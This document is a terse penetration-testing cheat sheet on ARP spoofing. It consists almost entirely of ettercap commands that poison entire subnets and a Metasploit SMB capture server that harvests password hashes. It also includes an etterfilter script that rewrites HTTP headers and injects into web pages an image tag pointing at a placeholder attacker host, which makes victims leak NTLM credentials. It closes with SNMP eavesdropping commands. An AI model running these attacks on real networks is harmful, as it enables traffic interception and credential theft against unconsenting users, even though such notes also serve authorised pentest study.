# ARP spoofing

```
arp -an
```

## Ettercap

```
ettercap -T -q -M arp:remote /172.16.0.1-254// /172.16.0.1-254//
ettercap -TqP smb_down -M arp:remote -F smbcapture.ef /IP// /IP//
```

- h for options

- q for quit

### Etterfilter

```
man etterfilter
```

Add the following: `-F myfilter.ef`

### SMB capture

``` 
msfconsole
use auxiliary/server/capture/smb
set JOHNPWFILE /tmp/johnpwn.txt
set CAINPWFILE /tmp/cainpwn.txt
exploit
```

smb.filter:

```
if (ip.proto == TCP && tcp.dst == 80) {
   if (search(DATA.data, "Accept-Encoding")) {
      replace("Accept-Encoding", "Accept-Rubbish!");
      msg("zapped Accept-Encoding!\n");
   }
}
if (ip.proto == TCP && tcp.dst == 80) {
   if (search(DATA.data, "If-Modified-Since")) {
      replace("If-Modified-Since", "If-PACified-Since");
      msg("zapped If-Modified-Since\n");
   }
}
if (ip.proto == TCP && tcp.src == 80) {
   replace("<head>", "<head> <img src=\"\\\\YOURKALIIP\\fake.jpg\"><junk>");
   msg("INJECT!\n");
}
```

Generate the ettercap filter:

`etterfilter -o smb.ef smb.filter`

Spoof : `ettercap -TqM arp:remote -F smb.ef -i tap0 /10.10.80.1-254// /10.10.80.2//`

## SNMP eavesdropping

```
ettercap -TqM arp:remote /10.10.10.1-254// 10.10.10.1-254// -p pcapfile
```

